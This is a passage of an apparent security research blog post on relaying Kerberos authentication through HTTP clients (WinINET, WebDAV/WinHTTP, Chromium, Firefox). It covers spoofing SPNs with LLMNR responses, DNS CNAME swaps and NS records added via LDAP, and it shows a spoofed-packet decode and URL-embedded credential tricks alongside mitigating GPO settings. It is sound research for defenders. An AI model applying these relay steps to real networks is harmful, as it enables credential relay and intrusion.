class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;To summarize the attack process as shown in the above diagram:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c24 lst-kix_i2wckd3yhfhe-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;The attacker sets up an LLMNR service on a machine in the same multicast domain at the victim computer. The attacker listens for a target name request such as &lt;/span&gt;&lt;span class="c4"&gt;EVILHOST&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;Trick the victim to use IE (or another WinINET client, such as via a document format like DOCX) to connect to the attacker&amp;#39;s server on &lt;/span&gt;&lt;span class="c4"&gt;http://EVILHOST&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;The LLMNR server receives the lookup request and responds by setting the address record&amp;#39;s hostname to the SPN target host to spoof and the IP address to the attacker-controlled server.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;The WinINET client extracts the spoofed canonical name, appends the &lt;/span&gt;&lt;span class="c4"&gt;HTTP &lt;/span&gt;&lt;span class="c3"&gt;service class to the SPN and requests the Kerberos service ticket. This Kerberos ticket is then sent to the attacker&amp;#39;s HTTP service.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;The attacker receives the Negotiate/Kerberos authentication for the spoofed SPN and relays it to the real target server.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;An example LLMNR response decoded by Wireshark for the name &lt;/span&gt;&lt;span class="c4"&gt;evilhost&lt;/span&gt;&lt;span&gt;&amp;nbsp;(with IP address 10.0.0.80), spoofing &lt;/span&gt;&lt;span class="c4"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which is &lt;/span&gt;&lt;span class="c4"&gt;not &lt;/span&gt;&lt;span class="c3"&gt;address 10.0.0.80) is shown below:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b649351b399dcc493def89e3b9168ea435d7a3e3"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;Link-local Multicast Name Resolution (response)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Transaction ID: 0x910f&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Flags: 0x8000 Standard query response, No error&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Questions: 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Answer RRs: 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Authority RRs: 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Additional RRs: 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Queries&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; evilhost: type A, class IN&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Name: evilhost&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [Name Length: 8]&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c4 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [Label Count: 1]&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Type: A (Host Address) (1)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Class: IN (0x0001)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; Answers&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fileserver.domain.com: type A, class IN, addr 10.0.0.80&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Name: fileserver.domain.com&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Type: A (Host Address) (1)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Class: IN (0x0001)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Time to live: 1 (1 second)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c12 c14 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Data length: 4&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4 c42"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Address: 10.0.0.80&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;You might assume that the SPN always having the &lt;/span&gt;&lt;span class="c4"&gt;HTTP &lt;/span&gt;&lt;span&gt;service class would be a problem. However, the Active Directory default SPN mapping will map &lt;/span&gt;&lt;span class="c4"&gt;HTTP &lt;/span&gt;&lt;span&gt;to the &lt;/span&gt;&lt;span class="c4"&gt;HOST &lt;/span&gt;&lt;span class="c3"&gt;service class which is always registered. Therefore you can target any domain joined system without needing to register an explicit SPN. As long as the receiving service doesn&amp;#39;t then verify the SPN it will work to authenticate to the computer account, which is used by privileged services. You can use the following PowerShell script to list all the configured SPN mappings in a domain.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.28ed80520ca46d9c5e76e6e7185f42f9102dbf8d"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c2 c23"&gt;$base_dn&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c17"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c2 c13"&gt;Get-ADRootDSE&lt;/span&gt;&lt;span class="c2"&gt;)&lt;/span&gt;&lt;span class="c2 c17"&gt;.&lt;/span&gt;&lt;span class="c6 c2"&gt;configurationNamingContext&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c2 c23"&gt;$dn&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c17"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c27"&gt;&amp;quot;CN=Directory Service,CN=Windows NT,CN=Services,&lt;/span&gt;&lt;span class="c2 c23"&gt;$base_dn&lt;/span&gt;&lt;span class="c2 c27"&gt;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;PS&amp;gt; (&lt;/span&gt;&lt;span class="c2 c13"&gt;Get-ADObject&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c23"&gt;$dn&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c34"&gt;-Properties&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c35"&gt;sPNMappings&lt;/span&gt;&lt;span class="c2"&gt;)&lt;/span&gt;&lt;span class="c2 c17"&gt;.&lt;/span&gt;&lt;span class="c6 c2"&gt;sPNMappings&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One interesting behavior of WinINET is that it always requests &lt;/span&gt;&lt;span class="c4"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;delegation, although that will only be useful if the SPN&amp;#39;s target account is registered for delegation. I couldn&amp;#39;t convince WinINET to default to a Kerberos only mode; sending back a &lt;/span&gt;&lt;span class="c4"&gt;WWW-Authenticate: Kerberos&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;header causes the authentication process to stop. This means the Kerberos AP_REQ will always have Integrity enabled even though the user agent doesn&amp;#39;t explicitly request it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Another user of WinINET is Office. For example you can set a template located on an HTTP URL which will generate local Windows authentication if in the Intranet zone just by opening a Word document. This is probably a good vector for getting the authentication started rather than relying on Internet Explorer being available.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;WinINET does have some &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537164(v=vs.85)"&gt;feature controls&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which can be enabled on a per-executable basis which affect the behavior of the SPN lookup process, specifically &lt;/span&gt;&lt;span class="c4"&gt;FEATURE_USE_CNAME_FOR_SPN_KB911149&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;and &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;FEATURE_ALWAYS_USE_DNS_FOR_SPN_KB3022771&lt;/span&gt;&lt;span class="c3"&gt;. However these only seem to come into play if the HTTP connection is being proxied, which we&amp;#39;re assuming isn&amp;#39;t the case.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.8vgvwmfq3mv1"&gt;&lt;span class="c31"&gt;WinHTTP (WebDAV WebClient)&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/winhttp/about-winhttp"&gt;WinHTTP library&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an alternative to using WinINET in a client application. It&amp;#39;s a cleaner API and doesn&amp;#39;t have the baggage of being used in Internet Explorer. As an example client I chose to use the built-in WebDAV WebClient service because it gives the interesting property that it converts a UNC file name request into a potentially exploitable HTTP request. If the WebClient service is installed and running then opening a file of the form &lt;/span&gt;&lt;span class="c4"&gt;\\EVIL\abc&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;will cause an HTTP request to be sent out to a server under the attacker&amp;#39;s control.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;From what I can tell the behavior of WinHTTP when used with the WebClient service is almost exactly the same as for WinINET. I could exploit the SPN generation through local DNS resolution, but not from a public DNS name record. WebDAV seems to consider undotted names to be Intranet zone, however the default for WinHTTP seems to depend on whether the connection would bypass the proxy. The automatic authentication decision is based on the value of the &lt;/span&gt;&lt;span class="c4"&gt;WINHTTP_OPTION_AUTOLOGON_POLICY&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;policy.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;At least as used with WebDAV WinHTTP handles a &lt;/span&gt;&lt;span class="c4"&gt;WWW-Authenticate&lt;/span&gt;&lt;span&gt;&amp;nbsp;header of &lt;/span&gt;&lt;span class="c4"&gt;Kerberos&lt;/span&gt;&lt;span&gt;, however it ends up using the &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;package regardless and so Integrity will always be enabled. It also enables Kerberos delegation automatically like WinINET.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.pjg6jrw6yjqn"&gt;&lt;span class="c31"&gt;Chromium M93&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span&gt;Chromium based browsers such as Chrome and Edge are open source so it&amp;#39;s a bit easier to check the implementation. By default Chromium will automatically authenticate to intranet zone sites, it uses the same Internet Security Manager used by WinINET to make the zone determination in &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://source.chromium.org/chromium/chromium/src/+/main:net/http/url_security_manager_win.cc;drc=739ccc21289257112c667e04a40d9a5a2db466bf;l=50"&gt;URLSecurityManagerWin::CanUseDefaultCredentials&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;. An administrator can set GPOs to change this behavior to only allow automatic authentication to a set of hosts.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The SPN is generated in &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_auth_handler_negotiate.cc;drc=78c0778431c6fdd3dead532b1774270486829251;l=248"&gt;HttpAuthHandlerNegotiate::CreateSPN&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is called from &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_auth_handler_negotiate.cc;drc=a412d0ef42cd54ca75e76023a8ccf13d6f58bf06;l=356"&gt;HttpAuthHandlerNegotiate::DoResolveCanonicalNameComplete&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. While the documentation for &lt;/span&gt;&lt;span class="c4"&gt;CreateSPN &lt;/span&gt;&lt;span class="c3"&gt;mentions it&amp;#39;s basically a copy of the behavior in IE, it technically isn&amp;#39;t. Instead of taking the canonical name from the initial DNS request it does a second DNS request, and the result of that is used to generate the SPN. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;This second DNS request is important as it means that we now have a way of exploiting this from a public DNS name. If you set the TTL of the initial host DNS record to a very low value, then it&amp;#39;s possible to change the DNS response between the lookup for the host to connect to and the lookup for the canonical name to use for the SPN. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This will also work with local DNS resolution as well, though in that case the response doesn&amp;#39;t need to be switched as one response is sufficient. This second DNS lookup behavior can be disabled with a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://admx.help/?Category=Chrome&amp;Policy=Google.Policies.Chrome::DisableAuthNegotiateCnameLookup"&gt;GPO&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;. If this is disabled then neither local DNS resolution nor public DNS will work as Chromium will use the host specified in the URL for the SPN.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;In a domain environment where the Chromium browser is configured to only authenticate to Intranet sites we can abuse the fact that by default authenticated users can add new DNS records to the Microsoft DNS server through LDAP (see &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/"&gt;this blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;by &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://twitter.com/kevin_robertson"&gt;Kevin Robertson&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;). Using the domain&amp;#39;s DNS server is useful as the DNS record could be looked up using a short Intranet name rather than a public DNS name meaning it&amp;#39;s likely to be considered a target for automatic authentication.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One problem with using LDAP to add the DNS record is the time before the DNS server will refresh its records is at least 180 seconds. This would make it difficult to switch the response from a normal address record to a CNAME record in a short enough time frame to be useful. Instead we can add an NS record to the DNS server which forwards the lookup to our own DNS server. As long as the TTL for the DNS response is short the domain&amp;#39;s DNS server will rerequest the record and we can return different responses without any waiting for the DNS server to update from LDAP. This is very similar to &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://en.wikipedia.org/wiki/DNS_rebinding"&gt;DNS rebinding attack&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;, except instead of swapping the IP address, we&amp;#39;re swapping the canonical name.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c25 c14 c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEh1TOvmY3p9cuk3lJdRZ8WKstDkX6N1_3iBLKo-IKFncIiRuokfjzJE4sXdb3O89inLCz5s6H7lO4_Pq8HVdMwzyJvYIao-IhSKRJm-vHBSlDzBFfe7vJhL05iKhn_1Jy9mft4nSrNY7eggb2KsfjO2JXEtSlqfV44Pd8cDODKHEK087TBDryW82cGTHA=s898" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEh1TOvmY3p9cuk3lJdRZ8WKstDkX6N1_3iBLKo-IKFncIiRuokfjzJE4sXdb3O89inLCz5s6H7lO4_Pq8HVdMwzyJvYIao-IhSKRJm-vHBSlDzBFfe7vJhL05iKhn_1Jy9mft4nSrNY7eggb2KsfjO2JXEtSlqfV44Pd8cDODKHEK087TBDryW82cGTHA=s898" border="0" alt="Diagram of two DNS request attack against Chromium" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c25 c14 c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Therefore a working exploit as shown in the diagram would be the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c24 lst-kix_wkcrlfh2qk3l-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;Register an NS record with the DNS server for &lt;/span&gt;&lt;span class="c4"&gt;evilhost.domain.com&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;using existing authenticated credentials via LDAP. Wait for the DNS server to pick up the record.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;Direct the browser to connect to &lt;/span&gt;&lt;span class="c4"&gt;http://evilhost&lt;/span&gt;&lt;span&gt;. T&lt;/span&gt;&lt;span&gt;his allows Chromium to automatically authenticate as it&amp;#39;s an undotted Intranet host. The browser will lookup &lt;/span&gt;&lt;span class="c4"&gt;evilhost.domain.com&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;by adding its primary DNS suffix. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;This request goes to the client&amp;#39;s DNS server, which then follows the NS record and performs a recursive query to the attacker&amp;#39;s DNS server. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;The attacker&amp;#39;s DNS server returns a normal address record for their HTTP server with a very short TTL.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;The browser makes a request to the HTTP server, at this point the attacker delays the response long enough for the cached DNS request to expire. It can then return a 401 to get the browser to authenticate.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;The browser makes a second DNS lookup for the canonical name. As the original request has expired, another will be made for &lt;/span&gt;&lt;span class="c4"&gt;evilhost.domain.com&lt;/span&gt;&lt;span&gt;. For this lookup the attacker returns a CNAME record for the &lt;/span&gt;&lt;span class="c4"&gt;fileserver.domain.com&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;target. The client&amp;#39;s DNS server will look up the IP address for the CNAME host and return that.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;The browser will generate the SPN based on the CNAME record and that&amp;#39;ll be used to generate the AP_REQ, sending it to the attacker&amp;#39;s HTTP server.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;The attacker can relay the AP_REQ to the target server.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;It&amp;#39;s possible that we can combine the local and public DNS attack mechanisms to only need one DNS request. In this case we could set up an NS record to our own DNS server and get the client to resolve the hostname. The client&amp;#39;s DNS server would do a recursive query, and at this point our DNS server shouldn&amp;#39;t respond immediately. We could then start a classic DNS spoofing attack to return a DNS response packet directly to the client with the spoofed address record.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;In general DNS spoofing is limited by requiring the source IP address, transaction ID and the UDP source port to match before the DNS client will accept the response packet. The source IP address should be spoofable on a local network and the client&amp;#39;s IP address can be known ahead of time through an initial HTTP connection, so the only problems are the transaction ID and port.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;As most clients have a relatively long timeout of 3-5 seconds, that might be enough time to try the majority of the combinations for the ID and port. Of course there isn&amp;#39;t really a penalty for trying multiple times. If this attack was practical then you could do the attack on a local network even if local DNS resolution was disabled and enable the attack for libraries which only do a single lookup such as WinINET and WinHTTP. The response could have a long TTL, so that when the access is successful it doesn&amp;#39;t need to be repeated for every request.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;I couldn&amp;#39;t get Chromium to downgrade &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;to &lt;/span&gt;&lt;span class="c4"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;only so Integrity will be enabled. Also since Delegation is not enabled by default, an administrator needs to configure an &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://admx.help/?Category=Chrome&amp;Policy=Google.Policies.Chrome::AuthNegotiateDelegateWhitelist"&gt;allow list GPO&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;to specify what targets are allowed to receive delegated credentials.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;A bonus quirk for Chromium: It seems to be the only browser which still supports URL based user credentials. If you pass user credentials in the request and get the server to return a request for &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;authentication then it&amp;#39;ll authenticate automatically regardless of the zone of the site. You can also pass credentials using &lt;/span&gt;&lt;span class="c4"&gt;XMLHttpRequest::open&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;While not very practical, this can be used to test a user&amp;#39;s password from an arbitrary host. If the username/password is correct and the SPN is spoofed then Chromium will send a validated Kerberos AP_REQ, otherwise either NTLM or no authentication will be sent. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;NTLM can be always generated as it doesn&amp;#39;t require any proof the password is valid, whereas Kerberos requires the password to be correct to allow the authentication to succeed. You need to specify the domain name when authenticating so you use a URL of the form &lt;/span&gt;&lt;span class="c25 c14 c4"&gt;http://DOMAIN%5CUSER:PASSWORD@host.com.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One other quirk of this is you can specify a fully qualified domain name (FQDN) and user name and the Windows Kerberos implementation will try and authenticate using that server based on the DNS SRV records. For example &lt;/span&gt;&lt;span class="c4"&gt;http://EVIL.COM%5CUSER:PASSWORD@host.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;will try to authenticate to the Kerberos service specified through the &lt;/span&gt;&lt;span class="c4"&gt;_kerberos._tcp.evil.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;SRV record&lt;/span&gt;&lt;span class="c3"&gt;. This trick works even on non-domain joined systems to generate Kerberos authentication, however it&amp;#39;s not clear if this trick has any practical use.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;It&amp;#39;s worth noting that I did discuss the implications of the Chromium HTTP vector with team members internally and the general conclusion that this behavior is by design as it&amp;#39;s trying to copy the behavior expected of existing user agents such as IE.&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;Therefore there was no expectation it would be fixed.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.xfgb3dttm6vh"&gt;&lt;span class="c31"&gt;Firefox 91&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span&gt;As with Chromium, Firefox is open source so we can find the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://searchfox.org/mozilla-central/source/extensions/auth/nsHttpNegotiateAuth.cpp#170"&gt;implementation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Unlike the other HTTP implementations researched up to this point, Firefox doesn&amp;#39;t perform Windows authentication by default. An administrator needs to configure either a list of hosts that are allowed to automatically authenticate, or the &lt;/span&gt;&lt;span class="c4"&gt;network.negotiate-auth.allow-non-fqdn&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;setting can be enabled to 